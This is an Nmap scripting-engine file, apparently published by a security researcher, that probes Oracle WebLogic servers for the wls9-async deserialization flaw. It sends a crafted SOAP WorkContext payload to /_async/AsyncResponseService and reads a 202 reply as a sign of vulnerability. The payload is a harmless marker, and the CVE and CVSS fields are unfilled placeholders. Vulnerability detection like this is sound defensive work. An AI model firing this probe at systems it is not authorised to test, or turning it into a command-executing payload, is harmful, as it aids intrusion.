local http = require "http"
local nmap = require "nmap"
local stdnse = require "stdnse"
local vulns = require "vulns"
description = [[
Weblogic CNVD-C-2019-48814
$ git clone https://github.com/Rvn0xsy/nse_vuln.git
$ cd /nse_vuln/
$ sudo cp * /usr/share/nmap/scripts/
$ sudo nmap -sV -p 7001 --script weblogic-CNVD-C-2019-48814.nse victim_host

]]
---
-- @usage
-- nmap -sV --script weblogic-CNVD-C-2019-48814 <target> -p 7001
-- nmap -sV --script weblogic-CNVD-C-2019-48814
--
-- @output
-- PORT     STATE SERVICE
-- 7001/tcp open  afs3-callback
-- | weblogic-CNVD-C-2019-48814:
-- |   VULNERABLE:
-- |   Oracle WebLogic wls9-async Deserialization Remote Command Execution Vulnerability
-- |     State: VULNERABLE
-- |     IDs:  1:CNVD-C-2019-48814  CVE:CVE-2019-????
-- |     Risk factor: High  CVSSv3: ???
-- |
-- |     Disclosure date: 2019-04-17
-- |     References:
-- |       http://www.cnvd.org.cn/webinfo/show/4989
-- |       http://www.cnvd.org.cn/webinfo/show/4999
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-????

author = "Rvn0xsy <rvn0xsy@gmail.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln"}
blog = "https://payloads.online"

portrule = function(host,port)
--	if(port.number == 7001)then
--		return true
--	end
--	return false
	return true
end

action = function(host,port)
 local vuln_table = {
    title ="Oracle WebLogic wls9-async Deserialization Remote Command Execution Vulnerability",
    IDS = {CVE = 'CVE-2019-????','CNVD-C-2019-48814'},
    risk_factor = "High",
    scores = {
      CVSSv3 = "???",
    },
    description = [[]],
    references = {
        'http://www.cnvd.org.cn/webinfo/show/4989',
        'http://www.cnvd.org.cn/webinfo/show/4999',
    },
    dates = {
      disclosure = {year = '2019', month = '04', day = '17'},
    },
    check_results = {},
    extra_info = {}
  }
    local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
    vuln_table.state = vulns.STATE.NOT_VULN
    path = "/_async/AsyncResponseService"
    local result = http.get(host,port,path)
    local status = stdnse.output_table()
	if(result.status == 200)then
        if(string.find(result.body,"async") == nil)then
            local status = stdnse.output_table()
            status.Vuln = "False"
            return status
        end
        options = {}
        options['header'] = {}
        options['header']['Content-Type'] = 'text/xml'
        local payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n<soapenv:Header>\n<wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n<void class=\"POC\">\n<array class=\"xx\" length=\"0\">\n</array>\n<void method=\"start\"/>\n</void>\n</work:WorkContext>\n</soapenv:Header>\n<soapenv:Body>\n<asy:onAsyncDelivery/>\n</soapenv:Body>\n</soapenv:Envelope>\n"
        local response = http.post(host,port,path,options,nil,payload)
        if(response.status == 202)then
            vuln_table.state = vulns.STATE.VULN
            return vuln_report:make_output(vuln_table)
        end
	end
    return vuln_report:make_output(vuln_table)
end
